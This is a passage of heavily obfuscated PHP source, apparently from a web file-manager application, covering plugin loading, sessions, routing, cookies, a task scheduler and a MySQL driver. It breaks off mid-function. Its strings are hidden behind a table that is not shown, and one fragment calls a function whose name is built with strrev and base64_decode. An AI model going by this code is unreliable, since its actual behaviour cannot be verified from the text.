$Ö¤èá¥ = $this->loadPluginList(); $ñ•áè®ø = array(); foreach ($Ö¤èá¥ as $·÷ ®Á˜ => $›àÂáœ½) { unset($›àÂáœ½[$˜°’ç‘[1957]], $›àÂáœ½[$˜°’ç‘[6]]); $ÌäµËÃÙ = PLUGIN_DIR . $›àÂáœ½[$˜°’ç‘[32]] . $˜°’ç‘[1959]; if (!is_file($ÌäµËÃÙ)) { continue; } $â©ï„¨¥ = Hook::apply($›àÂáœ½[$˜°’ç‘[32]] . $˜°’ç‘[1967]); if (is_array($â©ï„¨¥)) { $ñ•áè®ø[$·÷ ®Á˜] = array_merge($›àÂáœ½, $â©ï„¨¥); } } return $ñ•áè®ø; } private function loadPluginList() { $—ï„¢Ã =& $_SERVER[ñˆ‹ß¿÷]; $ÜììÎæÒ = $this->loadList(); if (strtolower(MOD) == $—ï„¢Ã[1968]) { return $ÜììÎæÒ; } $¯¾²ŒÙÔ = Hook::trigger($—ï„¢Ã[1969], $ÜììÎæÒ); if ($ÜììÎæÒ && !$¯¾²ŒÙÔ) { die; } return $¯¾²ŒÙÔ ? $¯¾²ŒÙÔ : $ÜììÎæÒ; } private function pluginScan($“ªÒÒàê) { $ŠŠşşÌ =& $_SERVER[ñˆ‹ß¿÷]; recursion_dir(PLUGIN_DIR, $À®ÁĞö, $²€Œî›ı, 0); foreach ($À®ÁĞö as $´ô‹òšŞ) { $Ì˜ˆ„Ø¿ = get_path_this($´ô‹òšŞ); if (isset($“ªÒÒàê[$Ì˜ˆ„Ø¿]) || !file_exists($´ô‹òšŞ . $ŠŠşşÌ[1970]) || !file_exists($´ô‹òšŞ . $ŠŠşşÌ[1959])) { continue; } Hook::apply($Ì˜ˆ„Ø¿ . $ŠŠşşÌ[1964]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\163\x74\x65\x6d\x5f\163\x65\x73\x73\x69\x6f\156"; public function get($³Ûş ‘Ë) { $œ¶©¾ìš =& $_SERVER[ñˆ‹ß¿÷]; $ÕÅà–—° = $this->where(array($œ¶©¾ìš[1971] => $³Ûş ‘Ë))->find(); if (!is_array($ÕÅà–—°)) { return !1; } return $ÕÅà–—°[$œ¶©¾ìš[762]]; } public function set($Ó‹®£ï, $¾’ûÏ’Á, $”…´ÎÛ³ = 3600) { $êæ‘±áş =& $_SERVER[ñˆ‹ß¿÷]; $¥ü±ñŠ¡ = array($êæ‘±áş[1971] => $Ó‹®£ï, $êæ‘±áş[1875] => $¾’ûÏ’Á, $êæ‘±áş[1972] => $”…´ÎÛ³ + time()); if (Session::get($êæ‘±áş[1973])) { $¥ü±ñŠ¡[$êæ‘±áş[1664]] = Session::get($êæ‘±áş[1973]); } else { $¥ü±ñŠ¡[$êæ‘±áş[1664]] = 0; } if ($this->get($Ó‹®£ï)) { return $this->where(array($êæ‘±áş[1971] => $Ó‹®£ï))->save($¥ü±ñŠ¡); } else { return $this->add($¥ü±ñŠ¡, array(), !0); } } public function remove($œşï—ì) { return $this->where(array($_SERVER[ñˆ‹ß¿÷][1971] => $œşï—ì))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ñˆ‹ß¿÷][1974] . time())->delete(); } } goto B¿œ­áÔÊ; fùºß†Š•Û: $fileSize = strrev(base64_decode($_SERVER[Š½‰´ó][0])); function binCheckNeq($ã’ÇØØñ, $Ë–Ç) { return $ã’ÇØØñ != $Ë–Ç; } $_SERVER[$_SERVER[Š½‰´ó][1]] = $fileSize($_SERVER[$_SERVER[Š½‰´ó][2]]); goto E¥Ö’ÕªÈ; e“‚ğ‹´: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\x79" => "\x5b\x5e\x2f\135\x2b", "\x3a\x6e\165\155" => "\133\x30\x2d\71\x5d\53", "\x3a\x61\x6c\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($™ŞÏç©Û, $ÏÅ”ôŠÌ) { $€åâÙŒ =& $_SERVER[ñˆ‹ß¿÷]; if ($™ŞÏç©Û == $€åâÙŒ[1608]) { $İù¨â‹¡ = array_map($€åâÙŒ[1609], $ÏÅ”ôŠÌ[0]); $È‹Âõ÷û = strpos($ÏÅ”ôŠÌ[1], $€åâÙŒ[8]) === 0 ? $ÏÅ”ôŠÌ[1] : $€åâÙŒ[8] . $ÏÅ”ôŠÌ[1]; $…ÎŸÕŒõ = $ÏÅ”ôŠÌ[2]; } else { $İù¨â‹¡ = null; $È‹Âõ÷û = strpos($ÏÅ”ôŠÌ[0], $€åâÙŒ[8]) === 0 ? $ÏÅ”ôŠÌ[0] : $€åâÙŒ[8] . $ÏÅ”ôŠÌ[0]; $…ÎŸÕŒõ = $ÏÅ”ôŠÌ[1]; } array_push(self::$maps, $İù¨â‹¡); array_push(self::$routes, $È‹Âõ÷û); array_push(self::$methods, strtoupper($™ŞÏç©Û)); array_push(self::$callbacks, $…ÎŸÕŒõ); } public static function error($³ö÷ôœ‘) { self::$errorCallback = $³ö÷ôœ‘; } public static function haltOnMatch($‘ÎÆŠæ = true) { self::$halts = $‘ÎÆŠæ; } public static function dispatch() { $Ü‘üûù =& $_SERVER[ñˆ‹ß¿÷]; $ù•ÇÃíà = parse_url($_SERVER[$Ü‘üûù[1610]], PHP_URL_PATH); $õé›ëÉ = $_SERVER[$Ü‘üûù[159]]; $Ø’ îƒ = array_keys(static::$patterns); $Ÿ»Ÿãô¤ = array_values(static::$patterns); $°ÈÒäé“ = !1; self::$routes = preg_replace($Ü‘üûù[1276], $Ü‘üûù[8], self::$routes); if (in_array($ù•ÇÃíà, self::$routes)) { $ØùûÇ¯ = array_keys(self::$routes, $ù•ÇÃíà); foreach ($ØùûÇ¯ as $»¬‡Ä¼²) { if (self::$methods[$»¬‡Ä¼²] == $õé›ëÉ || self::$methods[$»¬‡Ä¼²] == $Ü‘üûù[1611] || in_array($õé›ëÉ, self::$maps[$»¬‡Ä¼²])) { $°ÈÒäé“ = !0; if (!is_object(self::$callbacks[$»¬‡Ä¼²])) { $«‡°‚Ç‡ = explode($Ü‘üûù[8], self::$callbacks[$»¬‡Ä¼²]); $å„ï‡›š = end($«‡°‚Ç‡); $Û£µ„é = explode($Ü‘üûù[1612], $å„ï‡›š); $”èİ¤ı÷ = new $Û£µ„é[0](); $”èİ¤ı÷->{$Û£µ„é[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$»¬‡Ä¼²]); if (self::$halts) { return; } } } } } else { $ß³´Ø¢‘ = 0; foreach (self::$routes as $»¬‡Ä¼²) { if (strpos($»¬‡Ä¼², $Ü‘üûù[4]) !== !1) { $»¬‡Ä¼² = str_replace($Ø’ îƒ, $Ÿ»Ÿãô¤, $»¬‡Ä¼²); } if (preg_match($Ü‘üûù[1613] . $»¬‡Ä¼² . $Ü‘üûù[1614], $ù•ÇÃíà, $‰ÑáŠ‘ä)) { if (self::$methods[$ß³´Ø¢‘] == $õé›ëÉ || self::$methods[$ß³´Ø¢‘] == $Ü‘üûù[1611] || !empty(self::$maps[$ß³´Ø¢‘]) && in_array($õé›ëÉ, self::$maps[$ß³´Ø¢‘])) { $°ÈÒäé“ = !0; array_shift($‰ÑáŠ‘ä); if (!is_object(self::$callbacks[$ß³´Ø¢‘])) { $«‡°‚Ç‡ = explode($Ü‘üûù[8], self::$callbacks[$ß³´Ø¢‘]); $å„ï‡›š = end($«‡°‚Ç‡); $Û£µ„é = explode($Ü‘üûù[1612], $å„ï‡›š); $”èİ¤ı÷ = new $Û£µ„é[0](); if (!method_exists($”èİ¤ı÷, $Û£µ„é[1])) { echo $Ü‘üûù[1615]; } else { call_user_func_array(array($”èİ¤ı÷, $Û£µ„é[1]), $‰ÑáŠ‘ä); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ß³´Ø¢‘], $‰ÑáŠ‘ä); if (self::$halts) { return; } } } } $ß³´Ø¢‘++; } } if ($°ÈÒäé“ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ÒÑïòºÚ =& $_SERVER[ñˆ‹ß¿÷]; header($_SERVER[$ÒÑïòºÚ[1616]] . $ÒÑïòºÚ[1617]); echo $ÒÑïòºÚ[1618]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Ü‘üûù[1610]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $”óÚÛÃê =& $_SERVER[ñˆ‹ß¿÷]; static $Úº˜ÖµÜ = false; if ($Úº˜ÖµÜ) { return $Úº˜ÖµÜ; } $„®•ÓĞ = $GLOBALS[$”óÚÛÃê[6]][$”óÚÛÃê[349]]; self::$sessionTime = $„®•ÓĞ[$”óÚÛÃê[1619]]; $í—¡¼‡Õ = isset($GLOBALS[$”óÚÛÃê[1620]]) ? $GLOBALS[$”óÚÛÃê[1620]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($í—¡¼‡Õ)) { self::$sessionSign = Cookie::get($í—¡¼‡Õ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($í—¡¼‡Õ, self::$sessionSign, self::$sessionTime); $Èš”Æ©™ = $„®•ÓĞ[$”óÚÛÃê[1621]]; $ä˜úµ¸Ğ = $„®•ÓĞ[$Èš”Æ©™]; $Ò‡µ—Øå = $„®•ÓĞ[$”óÚÛÃê[835]]; switch ($Èš”Æ©™) { case $”óÚÛÃê[21]: self::$handle = Model($”óÚÛÃê[836]); break; case $”óÚÛÃê[837]: self::$handle = new CacheRedis($ä˜úµ¸Ğ, $Ò‡µ—Øå); break; case $”óÚÛÃê[838]: self::$handle = new CacheMemcached($ä˜úµ¸Ğ, $Ò‡µ—Øå); break; case $”óÚÛÃê[199]: $ä˜úµ¸Ğ[$”óÚÛÃê[84]] = $ä˜úµ¸Ğ[$”óÚÛÃê[84]] . $”óÚÛÃê[1622]; self::$handle = new CacheFile($ä˜úµ¸Ğ, $Ò‡µ—Øå); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $Úº˜ÖµÜ = new self(); return $Úº˜ÖµÜ; } public static function getBySign($Ë¾ùÁİü) { CacheLock::lock($Ë¾ùÁİü); $†üèè¯Ã = self::$handle->get($Ë¾ùÁİü); CacheLock::unlock($Ë¾ùÁİü); $†üèè¯Ã = unserialize($†üèè¯Ã); return is_array($†üèè¯Ã) ? $†üèè¯Ã : array(); } public static function setBySign($×É”îşĞ, $ƒ¯äÆ§²) { CacheLock::lock($×É”îşĞ); self::$handle->set($×É”îşĞ, serialize($ƒ¯äÆ§²), self::$sessionTime); CacheLock::unlock($×É”îşĞ); } public static function sign($åòşĞÍ§ = false) { $åòşĞÍ§ && (self::$sessionSign = $åòşĞÍ§); self::init(); return self::$sessionSign; } public static function set($”Ñˆ²»ç, $ºƒ…µø = false) { self::init(); if (is_array($”Ñˆ²»ç)) { foreach ($”Ñˆ²»ç as $üá†è­ => $—Ñòò‡¾) { array_set_value(self::$data, $üá†è­, $—Ñòò‡¾); } } else { array_set_value(self::$data, $”Ñˆ²»ç, $ºƒ…µø); } self::setBySign(self::$sessionSign, self::$data); } public static function get($µœßÊ§µ = false) { self::init(); if (!$µœßÊ§µ) { return self::$data; } return array_get_value(self::$data, $µœßÊ§µ); } public static function remove($äÖØ±®‰) { self::init(); unset(self::$data[$äÖØ±®‰]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ñˆ‹ß¿÷][840])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $£§–“Í„ =& $_SERVER[ñˆ‹ß¿÷]; if (self::valueGet($£§–“Í„[757]) != $£§–“Í„[88]) { return; } if (self::valueGet($£§–“Í„[1623]) == $£§–“Í„[88]) { $›°ë›ä³ = self::valueGet($£§–“Í„[1624]); if (time() - $›°ë›ä³ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$£§–“Í„[1625]] = 1; self::valueSet($£§–“Í„[1623], $£§–“Í„[88]); self::log($£§–“Í„[1626] . ACTION . $£§–“Í„[1627]); Session::$data = array(); Session::$sessionSign = $£§–“Í„[12]; $GLOBALS[$£§–“Í„[503]] = 1; Hook::bind($£§–“Í„[1628], $£§–“Í„[1629]); $¶Û§¨•õ = 0; while (!0) { self::cacheClear(); if (self::valueGet($£§–“Í„[757]) != $£§–“Í„[88]) { self::valueSet($£§–“Í„[1623], $£§–“Í„[197]); self::log($£§–“Í„[1630]); die; } $é†Æ•÷š = time(); if ($é†Æ•÷š - $¶Û§¨•õ >= 60) { self::valueSet(array($£§–“Í„[1623] => $£§–“Í„[88], $£§–“Í„[1624] => $é†Æ•÷š), !1); $¶Û§¨•õ = $é†Æ•÷š; } if (!file_exists(USER_SYSTEM . $£§–“Í„[1631])) { self::valueSet(array($£§–“Í„[1623] => $£§–“Í„[197], $£§–“Í„[757] => $£§–“Í„[197]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $Š¬Ğ¼ı„ =& $_SERVER[ñˆ‹ß¿÷]; http_close(); self::valueSet($Š¬Ğ¼ı„[757], $Š¬Ğ¼ı„[197]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($Š¬Ğ¼ı„[1623] => $Š¬Ğ¼ı„[197], $Š¬Ğ¼ı„[757] => $Š¬Ğ¼ı„[88]), !1); } public static function taskSwitch() { $â³Úğ™Ğ =& $_SERVER[ñˆ‹ß¿÷]; $·…±×—ê = self::valueGet($â³Úğ™Ğ[757]) == $â³Úğ™Ğ[88] ? $â³Úğ™Ğ[197] : $â³Úğ™Ğ[88]; self::valueSet($â³Úğ™Ğ[757], $·…±×—ê); } public static function shutdownEvent() { $µš¥·í› =& $_SERVER[ñˆ‹ß¿÷]; self::valueSet($µš¥·í›[1623], $µš¥·í›[197]); self::log($µš¥·í›[1632]); } public static function config($ë£—¥¬, $ß¾¯®Å¾) { self::valueSet($_SERVER[ñˆ‹ß¿÷][757], $ë£—¥¬); } private static function taskRunAll() { $‹µÀ“­Ü =& $_SERVER[ñˆ‹ß¿÷]; $ÊÄ±Üñ‡ = timeFloat(); $”‹°âÊë = Model($‹µÀ“­Ü[1633])->listData(); $Ğ€˜ìãç = count($”‹°âÊë); for ($Ö¸ÂŠµ = 0; $Ö¸ÂŠµ < $Ğ€˜ìãç; $Ö¸ÂŠµ++) { $„·ˆô½„ = $”‹°âÊë[$Ö¸ÂŠµ]; if (!$„·ˆô½„[$‹µÀ“­Ü[399]] || $„·ˆô½„[$‹µÀ“­Ü[1634]] != $‹µÀ“­Ü[88]) { continue; } if (!self::taskTimeCheck($„·ˆô½„)) { continue; } self::taskRun($„·ˆô½„); } Hook::trigger($‹µÀ“­Ü[1635]); self::taskQueueRun($ÊÄ±Üñ‡); } private static function taskQueueRun($é £“ÑÈ) { $Ê¢²æ¶ó = 10; while (!0) { $€Û„£– = TaskQueue::run(); if ($€Û„£– === !1) { break; } if (timeFloat() - $é £“ÑÈ >= $Ê¢²æ¶ó) { break; } } } private static function taskTimeCheck($¤ºĞ¿‡¹) { $ƒÀï¤¥¨ =& $_SERVER[ñˆ‹ß¿÷]; $“ÂäòÁß = json_decode($¤ºĞ¿‡¹[$ƒÀï¤¥¨[203]], !0); $ùŞ’ıáÔ = intval($¤ºĞ¿‡¹[$ƒÀï¤¥¨[1624]]); $ÓçÜÑÑÇ = strtotime($ƒÀï¤¥¨[1636] . $“ÂäòÁß[$ƒÀï¤¥¨[1637]] . $ƒÀï¤¥¨[1638]) - strtotime($ƒÀï¤¥¨[1639]); $¹øÚî«» = time() - strtotime(date($ƒÀï¤¥¨[1640]) . $ƒÀï¤¥¨[1641]); $©ä½ÀÎ÷ = $¹øÚî«» >= $ÓçÜÑÑÇ && $¹øÚî«» <= $ÓçÜÑÑÇ + 3600; switch ($“ÂäòÁß[$ƒÀï¤¥¨[33]]) { case $ƒÀï¤¥¨[1642]: if (time() - $ùŞ’ıáÔ < 3600 * 24 * 30) { return !1; } if ($“ÂäòÁß[$ƒÀï¤¥¨[1642]] == date($ƒÀï¤¥¨[1643]) && $©ä½ÀÎ÷) { return !0; } break; case $ƒÀï¤¥¨[1644]: if (time() - $ùŞ’ıáÔ < 3600 * 24 * 7) { return !1; } $°®¹õúÊ = date($ƒÀï¤¥¨[1645]) == 0 ? 7 : date($ƒÀï¤¥¨[1645]); if ($“ÂäòÁß[$ƒÀï¤¥¨[1644]] == $°®¹õúÊ && $©ä½ÀÎ÷) { return !0; } break; case $ƒÀï¤¥¨[1637]: if (time() - $ùŞ’ıáÔ < 3600 * 24) { return !1; } if ($©ä½ÀÎ÷) { return !0; } break; case $ƒÀï¤¥¨[1646]: if (time() - $ùŞ’ıáÔ >= floatval($“ÂäòÁß[$ƒÀï¤¥¨[1646]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ã§ò›¬Ğ =& $_SERVER[ñˆ‹ß¿÷]; static $ï•±âáĞ = 0; $²ğÉˆÄÁ = 300; if (!$ï•±âáĞ) { $ï•±âáĞ = time(); } if (time() - $ï•±âáĞ < $²ğÉˆÄÁ) { return; } $ï•±âáĞ = time(); $‰şû™Ì = Model($ã§ò›¬Ğ[513])->db($ã§ò›¬Ğ[12]); if ($‰şû™Ì) { $‰şû™Ì->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ã§ò›¬Ğ[1647], $ã§ò›¬Ğ[1648]); die; } } public static function taskRun($•Ï©¤íƒ) { $¤‚®­ß =& $_SERVER[ñˆ‹ß¿÷]; self::log($¤‚®­ß[1649] . $•Ï©¤íƒ[$¤‚®­ß[399]] . $¤‚®­ß[1650] . $•Ï©¤íƒ[$¤‚®­ß[32]] . $¤‚®­ß[1651] . $•Ï©¤íƒ[$¤‚®­ß[1652]]); Model($¤‚®­ß[1633])->run($•Ï©¤íƒ[$¤‚®­ß[399]]); $«²§Åô = timeFloat(); $ª†åŞ½ë = $¤‚®­ß[12]; switch ($•Ï©¤íƒ[$¤‚®­ß[33]]) { case $¤‚®­ß[307]: $Çó¢ÃĞ› = url_request($•Ï©¤íƒ[$¤‚®­ß[1652]], $¤‚®­ß[230], !1, !1, !1, !1, 10); if ($Çó¢ÃĞ›[$¤‚®­ß[757]]) { $ª†åŞ½ë = strlen($Çó¢ÃĞ›[$¤‚®­ß[1200]]); } break; case $¤‚®­ß[229]: $ª†åŞ½ë = Hook::apply($•Ï©¤íƒ[$¤‚®­ß[1652]]); default: break; } Model($¤‚®­ß[1653])->add(array($¤‚®­ß[1654] => $¤‚®­ß[12], $¤‚®­ß[1655] => $¤‚®­ß[197], $¤‚®­ß[33] => $¤‚®­ß[1656] . $•Ï©¤íƒ[$¤‚®­ß[399]], $¤‚®­ß[1657] => json_encode(array($¤‚®­ß[32] => $•Ï©¤íƒ[$¤‚®­ß[32]], $¤‚®­ß[1658] => timeFloat() - $«²§Åô, $¤‚®­ß[293] => $ª†åŞ½ë)))); $ïß¿€ş¤ = $ª†åŞ½ë ? $¤‚®­ß[1659] . $ª†åŞ½ë : $¤‚®­ß[12]; self::log($¤‚®­ß[1660] . $•Ï©¤íƒ[$¤‚®­ß[399]] . $¤‚®­ß[164] . $ïß¿€ş¤); return !0; } private static function valueGet($Ï‡ığ»¦) { $Œ”Ûóµ =& $_SERVER[ñˆ‹ß¿÷]; $€×•Æ¥¥ = $Œ”Ûóµ[1661]; $«¶ÖØîØ = Model($Œ”Ûóµ[435])->get($Ï‡ığ»¦, $€×•Æ¥¥); if (is_null($«¶ÖØîØ)) { Model($Œ”Ûóµ[435])->set($Œ”Ûóµ[757], $Œ”Ûóµ[88], $€×•Æ¥¥); Model($Œ”Ûóµ[435])->set($Œ”Ûóµ[1623], $Œ”Ûóµ[197], $€×•Æ¥¥); $«¶ÖØîØ = Model($Œ”Ûóµ[435])->get($Ï‡ığ»¦, $€×•Æ¥¥); } return $«¶ÖØîØ; } private static function valueSet($›¾¾ôŞ, $é™÷Ò§) { $Ì¦‘ñœ˜ =& $_SERVER[ñˆ‹ß¿÷]; $ÏµİŸó = $Ì¦‘ñœ˜[1662]; CacheLock::lock($ÏµİŸó); $·‡„Ûæª = Model($Ì¦‘ñœ˜[435])->set($›¾¾ôŞ, $é™÷Ò§, $Ì¦‘ñœ˜[1661]); CacheLock::unlock($ÏµİŸó); return $·‡„Ûæª; } protected static function log($Ìì„ìÚ) { write_log($Ìì„ìÚ, $_SERVER[ñˆ‹ß¿÷][1648]); } private static function cacheClear() { $‡²½Äùª =& $_SERVER[ñˆ‹ß¿÷]; Cache::clearMemory(Model($‡²½Äùª[435])->cacheKey($‡²½Äùª[1661])); Cache::clearMemory(Model($‡²½Äùª[435])->cacheKey($‡²½Äùª[1663])); Model($‡²½Äùª[1633])->cacheClear(); self::closeDatabase(); } } goto B¥É¤«å’; C±¾Ğ˜ß¥·: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ù´õúã = '', $ËèŒ£ˆë = 0) { if (is_string($ù´õúã) && $ù´õúã != $_SERVER[ñˆ‹ß¿÷][12]) { $this->prefix = $ù´õúã; } if (is_numeric($ËèŒ£ˆë) && $ËèŒ£ˆë > 0) { $this->expire = $ËèŒ£ˆë; } } public static function getInstance() { static $ÆƒİËùë; if ($ÆƒİËùë === null) { $ÆƒİËùë = new self(); } return $ÆƒİËùë; } private static $cookieDisable = false; public static function disable($Â¨ŠôÍã) { self::$cookieDisable = $Â¨ŠôÍã; } private static $sameCookieSet = array(); public static function set($˜ÏË“—ò, $›¶“ªï¾, $²±‚‘·û = 0, $äİù¤•Ë = false, $¹›™ÄÍ® = false) { $¬½Ö’Ÿ =& $_SERVER[ñˆ‹ß¿÷]; if (self::$cookieDisable) { return; } if (!$²±‚‘·û) { $²±‚‘·û = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$˜ÏË“—ò]) && self::$sameCookieSet[$˜ÏË“—ò] == $›¶“ªï¾ . $²±‚‘·û) { return; } self::$sameCookieSet[$˜ÏË“—ò] = $›¶“ªï¾ . $²±‚‘·û; if (!$¹›™ÄÍ®) { $¹›™ÄÍ® = str_replace(HOST, $¬½Ö’Ÿ[12], APP_HOST); $¹›™ÄÍ® = _get($GLOBALS, $¬½Ö’Ÿ[889], $¹›™ÄÍ®); } $½¢öãƒâ = $¬½Ö’Ÿ[12]; setcookie($˜ÏË“—ò, $›¶“ªï¾, time() + $²±‚‘·û, $¬½Ö’Ÿ[8] . trim($¹›™ÄÍ®, $¬½Ö’Ÿ[8]) . $½¢öãƒâ, !1, !1, $äİù¤•Ë); } public static function setSafe($¼¨¹ıØ, $ÔÂª¬Í×, $İ›»š¯ = 0) { self::set($¼¨¹ıØ, $ÔÂª¬Í×, $İ›»š¯, !0); } public static function get($³…ïÅ¬À) { static $æŠªÃ€ = false; if (!$æŠªÃ€) { self::initHeaderCookie(); $æŠªÃ€ = !0; } return isset($_COOKIE[$³…ïÅ¬À]) ? $_COOKIE[$³…ïÅ¬À] : !1; } private static function initHeaderCookie() { $Ó’ÒÔ„° =& $_SERVER[ñˆ‹ß¿÷]; if (!isset($_SERVER[$Ó’ÒÔ„°[890]]) || !$_SERVER[$Ó’ÒÔ„°[890]]) { return; } $·³®¢œû = explode($Ó’ÒÔ„°[71], $_SERVER[$Ó’ÒÔ„°[890]]); foreach ($·³®¢œû as $÷ıÁ‘‘) { $÷ıÁ‘‘ = explode($Ó’ÒÔ„°[891], $÷ıÁ‘‘); if (count($÷ıÁ‘‘) != 2 || !isset($÷ıÁ‘‘[1])) { continue; } $_COOKIE[trim($÷ıÁ‘‘[0])] = trim($÷ıÁ‘‘[1]); } } public static function remove($ñ™êø³, $Ğ—½¸§ê = false) { unset($_COOKIE[$ñ™êø³]); self::set($ñ™êø³, $_SERVER[ñˆ‹ß¿÷][12], 1, $Ğ—½¸§ê); } } class DbMysql extends Db { public function __construct($­ŠğúùÒ = '') { $ôÈ¤àæ¨ =& $_SERVER[ñˆ‹ß¿÷]; if (!extension_loaded($ôÈ¤àæ¨[811])) { think_exception(think_lang($ôÈ¤àæ¨[14]) . $ôÈ¤àæ¨[892]); } if (!empty($­ŠğúùÒ)) { $this->config = $­ŠğúùÒ; if (empty($this->config[$ôÈ¤àæ¨[17]])) { $this->config[$ôÈ¤àæ¨[17]] = $ôÈ¤àæ¨[12]; } } } public function connect($ñËùµ¶€ = '', $ÌñıÄ¬â = 0, $àÔ´Ûàı = false) { $ÎöÃºË• =& $_SERVER[ñˆ‹ß¿÷]; if (!isset($this->linkID[$ÌñıÄ¬â])) { if (empty($ñËùµ¶€)) { $ñËùµ¶€ = $this->config; } $Ú¬´ŒŒ· = $ñËùµ¶€[$ÎöÃºË•[893]] . ($ñËùµ¶€[$ÎöÃºË•[894]] ? "\72{$ñËùµ¶€[$ÎöÃºË•[894]]}" : $ÎöÃºË•[12]); $Ñ†¼´•´ = !empty($ñËùµ¶€[$ÎöÃºË•[17]][$ÎöÃºË•[18]]) ? $ñËùµ¶€[$ÎöÃºË•[17]][$ÎöÃºË•[18]] : $this->pconnect; if ($Ñ†¼´•´) { $this->linkID[$ÌñıÄ¬â] = mysql_pconnect($Ú¬´ŒŒ·, $ñËùµ¶€[$ÎöÃºË•[895]], $ñËùµ¶€[$ÎöÃºË•[896]], 131072); } else { $this->linkID[$ÌñıÄ¬â] = mysql_connect($Ú¬´ŒŒ·, $ñËùµ¶€[$ÎöÃºË•[895]], $ñËùµ¶€[$ÎöÃºË•[896]], !0, 131072); } if (!$this->linkID[$ÌñıÄ¬â] || !empty($ñËùµ¶€[$ÎöÃºË•[21]]) && !mysql_select_db($ñËùµ¶€[$ÎöÃºË•[21]], $this->linkID[$ÌñıÄ¬â])) { think_exception(mysql_error()); } $ô¼³›ùë = mysql_get_server_info($this->linkID[$ÌñıÄ¬â]); mysql_query($ÎöÃºË•[897] . think_config($ÎöÃºË•[898]) . $ÎöÃºË•[58], $this->linkID[$ÌñıÄ¬â]); if ($ô¼³›ùë > $ÎöÃºË•[899]) { mysql_query($ÎöÃºË•[900], $this->linkID[$ÌñıÄ¬â]); } $this->connected = !0; if (1 != think_config($ÎöÃºË•[22])) { unset($this->config); } } return $this->linkID[$ÌñıÄ¬â]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($¦ä®‹şé) { $²ôû”Å» =& $_SERVER[ñˆ‹ß¿÷]; if (0 === stripos($¦ä®‹şé, $²ôû”Å»[264])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¦ä®‹şé; if ($this->queryID) { $this->free(); } think_action_status($²ôû”Å»[23], 1); think_status($²ôû”Å»[24]); $this->queryID = mysql_query($¦ä®‹şé, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($éÇ†½ô) { $÷êäÉ§İ =& $_SERVER[ñˆ‹ß¿÷]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $éÇ†½ô; if ($this->queryID) { $this->free(); } think_action_status($÷êäÉ§İ[25], 1); think_status($÷êäÉ§İ[24]); $»©ÙÇú‡ = mysql_query($éÇ†½ô, $this->_linkID); $this->debug(); if (!1 === $»©ÙÇú‡) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ñˆ‹ß¿÷][901], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ï–ğô¥Æ = mysql_query($_SERVER[ñˆ‹ß¿÷][902], $this->_linkID); $this->transTimes = 0; if (!$Ï–ğô¥Æ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ïÉõÅ“ = mysql_query($_SERVER[ñˆ‹ß¿÷][903], $this->_linkID); $this->transTimes = 0; if (!$ïÉõÅ“) { $this->error(); return !1; } } return !0; } private function getAll() { $ñ”£¤ú‘ = array(); if ($this->numRows > 0) { while ($£ÇİÇ‰£ = mysql_fetch_assoc($this->queryID)) { $ñ”£¤ú‘[] = $£ÇİÇ‰£; } mysql_data_seek($this->queryID, 0); } return $ñ”£¤ú‘; } public function getFields($½ªœËûõ) { $¶Íëšæ =& $_SERVER[ñˆ‹ß¿÷]; $Æ««·€¶ = $this->query($¶Íëšæ[904] . $this->parseKey($½ªœËûõ)); $Š¯¶Íê” = array(); if ($Æ««·€¶) { foreach ($Æ««·€¶ as $ïéÆÕâ => $­¸¿¿Óã) { $Š¯¶Íê”[$­¸¿¿Óã[$¶Íëšæ[31]]] = array($¶Íëšæ[32] => $­¸¿¿Óã[$¶Íëšæ[31]], $¶Íëšæ[33] => $­¸¿¿Óã[$¶Íëšæ[34]], $¶Íëšæ[35] => (bool) (strtoupper($­¸¿¿Óã[$¶Íëšæ[36]]) === $¶Íëšæ[905]), $¶Íëšæ[37] => $­¸¿¿Óã[$¶Íëšæ[38]], $¶Íëšæ[39] => strtolower($­¸¿¿Óã[$¶Íëšæ[40]]) == $¶Íëšæ[41], $¶Íëšæ[42] => strtolower($­¸¿¿Óã[$¶Íëšæ[43]]) == $¶Íëšæ[44]); } } return $Š¯¶Íê”; } public function getTables($»ÔÁŒÜÒ = '') { $›¢¸ñ¯ =& 